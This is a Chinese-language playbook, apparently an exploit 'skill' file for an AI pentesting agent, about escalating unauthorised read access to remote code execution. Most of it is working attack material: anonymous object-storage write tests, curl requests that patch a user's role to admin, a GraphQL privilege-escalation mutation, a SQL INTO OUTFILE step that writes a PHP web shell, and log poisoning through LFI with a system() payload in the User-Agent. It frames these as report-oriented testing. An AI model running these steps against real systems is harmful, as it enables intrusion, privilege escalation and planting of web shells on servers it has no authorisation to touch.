---
name: read-to-rce
description: 从"能读"升级到"能执行"：对象存储写、API 写、上传解析、SQL 写文件、日志包含、模板/配置注入
whenToUse: 已拿到未授权读取（对象存储列举、API 只读、文件下载、配置泄露），但还没有服务器权限
role: exploit
enabled: true
---

# 读 → 写 → 执行

## 先枚举"写"的可能

~~~
1. 同一个存储：匿名 List 之后必测 PutObject / DeleteObject
   aws --endpoint-url http://TARGET:9000 s3 cp x.html s3://BUCKET/x.html --no-sign-request
2. 同一个 API：只读接口旁边通常有 POST/PUT/PATCH，且鉴权常常只加在 GET 上
3. 上传功能：Content-Type 可控 + 通配子域 = 任意 HTML 托管
4. 配置项：能改的地方（站点配置、模板、公告、SEO）→ 能否注入模板语法或脚本
5. 数据库：能执行 SQL 的地方 → INTO OUTFILE / 存储过程
6. 日志：能控制日志内容 + 有 LFI → 日志包含
~~~

## 对象存储（MinIO / OSS / S3）

~~~bash
# 匿名写测试（不改已有对象，用新 key）
curl -X PUT --data 'probe' 'http://TARGET:9000/BUCKET/probe-$(date +%s).txt'
# 成功返回 200/204，失败 403 AccessDenied
# 桶策略可读：/BUCKET/?policy
# 版本控制/对象锁会阻止覆盖，但没有则同名覆盖可行
~~~

写进去的东西要能被"执行"才有价值：

~~~
HTML/JS → 需要有人用浏览器打开（客服工作台/管理后台）
SVG → 直接渲染执行 JS
PDF/Office → 需要目标端解析器有漏洞（另开一条路）
静态文件 → 只有当同域存在 XSS/开放重定向时才成为载荷宿主
~~~

## API 写

~~~bash
# 同路径换方法
curl -X POST  http://TARGET/api/v1/items -d '{"name":"x"}'
curl -X PATCH http://TARGET/api/v1/users/me -d '{"role":"admin"}'
# GraphQL mutation（introspection 已开的情况下直接照抄 schema）
{"query":"mutation{updateUser(id:1,input:{role:\"admin\"}){id role}}"}
~~~

## SQL 写文件（有 DB 执行能力时）

~~~sql
SELECT @@secure_file_priv, @@version_compile_os, CURRENT_USER();
SELECT '<?php system($_GET[1]);?>' INTO OUTFILE '/var/www/html/x.php';
-- 失败常见原因：secure_file_priv 指向空目录、FILE 权限缺失、目标目录不可写
~~~

## 日志包含

~~~bash
# 先确认 LFI 存在，且能读日志
curl 'http://TARGET/?file=../../../../var/log/apache2/access.log'
# 把 payload 写进 UA，再包含日志
curl -A '<?php system($_GET[1]);?>' http://TARGET/
curl 'http://TARGET/?file=/var/log/apache2/access.log&1=id'
~~~

## 判据

- 写成功 = 能读回自己写的内容（GET 那个 key）
- 执行 = 目标侧真的跑了代码（回显 / OAST 回连 / 文件落地）
- 只写进去但没人执行 → 记 `suspected`，在报告里写"需触发条件：X 打开页面"